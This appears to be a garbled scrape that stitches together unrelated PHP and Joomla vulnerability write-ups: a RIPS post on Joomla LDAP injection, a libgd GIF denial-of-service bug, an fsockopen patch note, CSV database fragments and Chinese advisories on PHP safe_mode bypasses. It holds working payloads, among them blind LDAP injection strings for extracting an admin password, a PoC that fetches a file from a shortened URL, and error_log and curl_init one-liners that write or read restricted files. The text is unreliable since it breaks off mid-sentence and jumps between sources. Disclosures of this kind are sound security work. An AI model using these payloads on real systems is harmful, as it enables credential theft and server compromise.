`/libraries/vendor/joomla/ldap/src/LdapClient.php` `` class LdapClient { public function simple_search($search) { $results = explode(';', $search); foreach ($results as $key =&gt; $result) { $results[$key] = '(' . $result . ')'; } return $this-&gt;search($results); }
    
    
    public function search(array $filters, ...)
    {
     foreach ($filters as $search_filter)
    {
     $search_result = @ldap_search($res, $dn, $search_filter, $attr);
    ⋮
    }
    }
    

} ``

Even if RIPS is unaware of the exact LDAP query that is loaded from an external configuration file, RIPS detects and reports successfully the root cause of this vulnerability: User input is mixed unsanitized with the LDAP query markup that is passed to the sensitive `ldap_search ` function. The vulnerability was detected within 7 minutes in half a million lines of Joomla! code.

The truncated analysis results are available in our RIPS demo application. Please note that we limited the results to the issues described in this post in order to ensure a fix is available.

[See RIPS report](<https://demo.ripstech.com/projects/joomla_3.7.5>)

### Proof Of Concept - Blind LDAP Injection

The lack of input sanitization of the username credential used in the LDAP query allows an adversary to modify the result set of the LDAP search. By using wildcard characters and by observing different authentication error messages, the attacker can literally search for the login credentials progressively by sending a row of payloads that guess the credentials character by character. `XXX;(&(uid=Admin)(userPassword=A*)) XXX;(&(uid=Admin)(userPassword=B*)) XXX;(&(uid=Admin)(userPassword=C*)) ... XXX;(&(uid=Admin)(userPassword=s*)) ... XXX;(&(uid=Admin)(userPassword=se*)) ... XXX;(&(uid=Admin)(userPassword=sec*)) ... XXX;(&(uid=Admin)(userPassword=secretPassword))`

Each of these payloads yield exactly one out of two possible states which allow an adversary to abuse the server as an Oracle. A filter bypass is necessary for exploitation that is not covered in this blog post. With an optimized version of these payloads, one bit per request can be extracted from the LDAP server which results in a highly efficient blind LDAP injection attack.

### Time Line

  * 2017/07/27 Provided vulnerability details and PoC to vendor
  * 2017/07/29 Vendor confirmed the security issue
  * 2017/09/19 Vendor released fixed version

### Summary

As one of the most popular open source CMS applications, Joomla! receives many code reviews from the security community. Yet alone one missed security vulnerability in the 500,000 lines of code can lead to a server compromise. With the help of [static code analysis](<https://www.ripstech.com/php-security-analysis/#static>), RIPS detected a critical LDAP injection vulnerability (CVE-2017-14596) that remained undiscovered for over 8 years. The vulnerability allows an attacker to steal login credentials from Joomla! installations that use LDAP authentication.

We would like to thank the Joomla! Security Strike Team for an excellent coordination and remediation of this issue and recommend to update to the latest Joomla! version 3.8 immediately.

### Vulnerability Details
The vulnerability is on the file [`ext/gd/libgd/gd_gif_in.c`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c)
There is a while-loop in [`LWZReadByte`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c#L460)

461        GetCode(fd, &sd->scd, sd->code_size, FALSE, ZeroDataBlockP);
463    } while (sd->firstcode == sd->clear_code);
```

Function `GetCode` is just a wrapper, and [`GetCode_`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c#L376) do the real stuff.
```
376    static int
377    GetCode_(gdIOCtx *fd, CODE_STATIC_DATA *scd, int code_size, int flag, int *ZeroDataBlockP)
378    {
379        int           i, j, ret;
380        unsigned char count;
           ... 

399        if ((count = GetDataBlock(fd, &scd->buf[2], ZeroDataBlockP)) <= 0)
400            scd->done = TRUE;
           ...
           
405    }
```


`GetCode_` call [`GetDataBlock`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c#L333) to read data from GIF!
```
332    static int
333    GetDataBlock_(gdIOCtx *fd, unsigned char *buf, int *ZeroDataBlockP)
334    {
335     unsigned char   count;
336    
336     if (! ReadOK(fd,&count,1)) {
338         return -1;
339     }
340    
341     *ZeroDataBlockP = count == 0;
342    
343     if ((count != 0) && (! ReadOK(fd, buf, count))) {
344         return -1;
345     }
346
347     return count;
348    }
```

OK, here are all vulnerable code, can you spot the vulnerability? :P



The bug relied on the type conversion from int to `unsigned` char. As you can see:
If `GetDataBlock_` return `-1`, `scd->done` in line 400 will set to True, and stop the while-loop. But it will never be executed because the definition of `count` is `unsigned char`, it’s always be a positive from 0 to 255.

So the result is, one single GIF can make an infinite loop and exhausted the server resource.

### PoC
```
$ curl -L https://git.io/vN0n4 | xxd -r > poc.gif
$ php -r 'imagecreatefromgif(""poc.gif"");'

separately: fsockopen('127.0.0.1', 80)

However, with the introdcution of stream transports in PHP 4.3,
it became possible to include the port in the hostname specifier:

fsockopen('127.0.0.1:80')
Or more formally: fsockopen('tcp://127.0.0.1:80')

Confusing results when these two forms are combined, however.
fsockopen('127.0.0.1:80', 443) results in fsockopen() attempting
to connect to '127.0.0.1:80:443' which any reasonable stack would
consider invalid.

Unfortunately, PHP parses the address looking for the first colon
(with special handling for IPv6, don't worry) and calls atoi()
from there.  atoi() in turn, simply stops parsing at the first
non-numeric character and returns the value so far.

The end result is that the explicitly supplied port is treated
as ignored garbage, rather than producing an error.

This diff replaces atoi() with strtol() and inspects the
stop character.  If additional ""garbage"" of any kind is found,
it fails and returns an error.","SSV:92911","https://www.seebug.org/vuldb/ssvid-92911","seebug","5.8","AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:NONE/","https://vulners.com/seebug/SSV:92911"

CVE ID：CVE-2008-2666
CNCVE ID：CNCVE-20082666

PHP 5是一款开放源代码的网络编程语言。
PHP 5 'chdir()'和'ftok()'函数存在'safe_mode绕过问题，远程攻击者可以利用漏洞在未授权位置检测文件是否存在等敏感信息。
 
问题代码如下：
- ---
PHP_FUNCTION(chdir)
{
char *str;
int ret, str_len;
 
if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;str,
&amp;str_len) == FAILURE) {
RETURN_FALSE;
}
 
if ((PG(safe_mode) &amp;&amp; !php_checkuid(str, NULL,
CHECKUID_CHECK_FILE_AND_DIR)) || php_check_open_basedir(str TSRMLS_CC))
{
RETURN_FALSE;
}
ret = VCWD_CHDIR(str);
 
if (ret != 0) {
php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;%s (errno %d)&quot;,
strerror(errno), errno);
RETURN_FALSE;
}
 
RETURN_TRUE;
}
- ---
 
str由safe_mode检查，如：
 
- ---
Warning: chdir(): SAFE MODE Restriction in effect. The script whose uid
is 80 is not allowed to access / owned by uid 0 in /www/mb/mb.php on
line 8
- ---
 
在当前目录中，可建立子目录&quot;http:&quot;，如chdir(&quot;http://../../../../../../&quot;)，那么就处于/目录中。
 
原因是：
 
TRUE==((PG(safe_mode) &amp;&amp; !php_checkuid(str, NULL,
CHECKUID_CHECK_FILE_AND_DIR)) || php_check_open_basedir(str
TSRMLS_CC)))
 
for
str=&quot;http://../../../../../../&quot;

"CVE-2008-2666","neuro.js","PHP chdir()和ftok()函数绕过safe_mode限制漏洞","exploit","BUGTRAQ  ID: 29796
CVE(CAN) ID: CVE-2008-2666

PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。

PHP的chdir()和ftok()函数中存在多个绕过safe_mode限制漏洞。

在chdir()函数中：

- ---
PHP_FUNCTION(chdir)
{
char *str;
int ret, str_len;

if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;str,
&amp;str_len) == FAILURE) {
RETURN_FALSE;
}

if ((PG(safe_mode) &amp;&amp; !php_checkuid(str, NULL,
CHECKUID_CHECK_FILE_AND_DIR)) || php_check_open_basedir(str TSRMLS_CC))
{
RETURN_FALSE;
}
ret = VCWD_CHDIR(str);

if (ret != 0) {
php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;%s (errno %d)&quot;,
strerror(errno), errno);
RETURN_FALSE;
}

RETURN_TRUE;
}
- ---

safe_mode检查了str，例如：

- ---
Warning: chdir(): SAFE MODE Restriction in effect. The script whose uid
is 80 is not allowed to access / owned by uid 0 in /www/mb/mb.php on
line 8
- ---

用户可以在当前目录中创建http:子目录，因此可以创建http://../../../../../../ 。

TRUE==((PG(safe_mode) &amp;&amp; !php_checkuid(str, NULL,
CHECKUID_CHECK_FILE_AND_DIR)) || php_check_open_basedir(str
TSRMLS_CC)))

对于str=&quot;http://../../../../../../&quot; ，safe_mode会忽略所有带有http:// 的目录。

ftok()函数中也存在类似的漏洞。

CVE ID: CVE-2009-2626

PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。 

在使用ini_restore()函数重置PHP配置环境时PG()类中的变量会显示任意部分的内存。如果要利用这个漏洞，攻击者必须要通过ini_set()函数声明变量。

- ---zend_ini.c---
static int zend_restore_ini_entry_cb(zend_ini_entry *ini_entry, int stage
TSRMLS_DC) /* {{{ */
{
if (ini_entry-&gt;modified) {
if (ini_entry-&gt;on_modify) {
zend_try {
/* even if on_modify bails out, we have to continue on with restoring,
since there can be allocated variables that would be freed on MM
shutdown
and would lead to memory corruption later ini entry is modified again
*/
ini_entry-&gt;on_modify(ini_entry, ini_entry-&gt;orig_value,
ini_entry-&gt;orig_value_length, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2,
ini_entry-&gt;mh_arg3, stage TSRMLS_CC);
} zend_end_try();
}
if (ini_entry-&gt;value != ini_entry-&gt;orig_value) {
efree(ini_entry-&gt;value);
}
ini_entry-&gt;value = ini_entry-&gt;orig_value;
ini_entry-&gt;value_length = ini_entry-&gt;orig_value_length;
ini_entry-&gt;modified = 0;
ini_entry-&gt;orig_value = NULL;
ini_entry-&gt;orig_value_length = 0;
if (ini_entry-&gt;modifiable &gt;= (1 &lt;&lt; 3)) {
ini_entry-&gt;modifiable &gt;&gt;= 3;
}
}
return 0;
}
- ---zend_ini.c---

所修改的标记会被重置。由于没有检查ini_entry-&gt;on_modify()的值，PG()会超出内存范围。

CVE(CAN) ID: CVE-2006-3011

PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。

PHP的error_log()函数中存在安全模式限制绕过漏洞：

PHP5:
- -2013-2050---
PHPAPI int _php_error_log(int opt_err, char *message, char *opt, char *headers TSRMLS_DC)

    php_stream *stream = NULL;

    switch (opt_err) {

        case 1:        /*send an email */
            {
#if HAVE_SENDMAIL
                if (!php_mail(opt, &quot;PHP error_log message&quot;, message, headers, NULL TSRMLS_CC)) {
                    return FAILURE;
                }
#else
                php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;Mail option not available!&quot;);
                return FAILURE;
#endif
            }
            break;

        case 2:        /*send to an address */
            php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;TCP/IP option not available!&quot;);
            return FAILURE;
            break;

        case 3:        /*save to a file */
            stream = php_stream_open_wrapper(opt, &quot;a&quot;, IGNORE_URL | ENFORCE_SAFE_MODE | REPORT_ERROR
S, NULL);
            if (!stream)
                return FAILURE;
            php_stream_write(stream, message, strlen(message));
            php_stream_close(stream);
            break;

        default:
            php_log_err(message TSRMLS_CC);
            break;
    }
    return SUCCESS;

- -2013-2050---

在选项3中：

- -2038 line---
stream = php_stream_open_wrapper(opt, &quot;a&quot;, IGNORE_URL | ENFORCE_SAFE_MODE | REPORT_ERRORS, 
NULL);
- -2038 line---

漏洞存在于php_stream_open_wrapper()。如果用户提供了“prefix://../../”的话，IGNORE_URL就会关闭safe_mode。

- -示例---

cxib# php -r 'error_log(&quot;&lt;? echo \&quot;cx\&quot;; ?&gt;&quot;, 3, &quot;/www/temp/sr.php&quot;
);'

Warning: error_log(): SAFE MODE Restriction in effect.  The script whose uid is 0 is not allowed to a
ccess /www/temp owned by uid
80 in Command line code on line 1

Warning: error_log(/www/temp/sr.php): failed to open stream: Invalid argument in Command line code on
line 1
cxib# php -r 'error_log(&quot;&lt;? echo \&quot;cx\&quot;; ?&gt;&quot;, 3, &quot;php://../../www/temp
/sr.php&quot;);'
cxib# ls -la /www/temp/sr.php
- -rw-r--r--  1 cxib  www  16 Jun 11 17:47 /www/temp/sr.php
cxib# 

拥有加载任意PHP代码或指定error_log()函数调用参数权限的用户可以利用这个漏洞从目标系统读取或写入受限文件。

curl_init()函数检查tmp_url-&gt;path的safemode和openbasedir。不是实际路径：

- --- 0.Description ---

PHP is an HTML-embedded scripting language. Much of its syntax is
borrowed from C, Java and Perl with a couple of unique
PHP-specific features thrown in. The goal of the language is to
allow web developers to write dynamically generated pages
quickly.

PHP supports libcurl, a library created by Daniel Stenberg, that
allows you to connect and communicate to many different types of
servers with many different types of protocols. libcurl currently
supports the http, https, ftp, gopher, telnet, dict, file, and
ldap protocols. libcurl also supports HTTPS certificates, HTTP
POST, HTTP PUT, FTP uploading (this can also be done with PHP's
ftp extension), HTTP form based upload, proxies, cookies, and
user+password authentication.

These functions have been added in PHP 4.0.2.

- --- 1. cURL ---
This is very similar to CVE-2006-2563.

http://securityreason.com/achievement_securityalert/39


The first issue [SAFE_MODE bypass]

var_dump(curl_exec(curl_init(&quot;file://safe_mode_bypass\x00&amp;qu
ot;.__FILE__)));

is caused by error in curl/interface.c

- ---
#define PHP_CURL_CHECK_OPEN_BASEDIR(str, len,
__ret) if (((PG(open_basedir) &amp;&amp; *PG(open_basedir)) ||
PG(safe_mode)) &amp;&amp;
strncasecmp(str, &quot;file:&quot;,
sizeof(&quot;file:&quot;) - 1) == 0) { php_url *tmp_url; if (!(tmp_url = php_url_parse_ex(str, len))) { php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;Invalid URL
'%s'&quot;, str); php_curl_ret(__ret); } if (!php_memnstr(str, tmp_url-&gt;path,
strlen(tmp_url-&gt;path), str + len)) { php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;URL '%s'
contains unencoded control characters&quot;, str); php_url_free(tmp_url); php_curl_ret(__ret); } if (tmp_url-&gt;query || tmp_url-&gt;fragment ||
php_check_open_basedir(tmp_url-&gt;path TSRMLS_CC) || (PG(safe_mode) &amp;&amp; !php_checkuid(tmp_url-&gt;path,
&quot;rb+&quot;, CHECKUID_CHECK_MODE_PARAM)) ) { php_url_free(tmp_url); php_curl_ret(__ret); } php_url_free(tmp_url); }
- ---

if you have tmp_url = php_url_parse_ex(str, len)
where:

str = &quot;file://safe_mode_bypass\x00&quot;.__FILE__

and this function will return:

tmp_url-&gt;path = __FILE__

curl_init() functions checks safemode and openbasedir for
tmp_url-&gt;path. Not for real path.
- ---
if (argc &gt; 0) {
char *urlcopy;
urlcopy = estrndup(Z_STRVAL_PP(url), Z_STRLEN_PP(url));
curl_easy_setopt(ch-&gt;cp, CURLOPT_URL, urlcopy);
zend_llist_add_element(&amp;ch-&gt;to_free.str, &amp;urlcopy);
}
- ---
最后一步curl_init()函数只拷贝file://safe_mode_bypass到urlcopy。
主要问题存在于php_url_parse_ex()函数中，如果curl_init() &quot;file://host/somewhere/path.php&quot;，php_url_parse_ex()就会选择/somewhere/path.php到路径变量，看起来不错，但不能使用，当你检查实际路径时，使用file:///etc/passwd是正确的，但是会在file://和/etc/passwd之间，php_url_parse_ex()会选择主机和返回路径给/passwd。
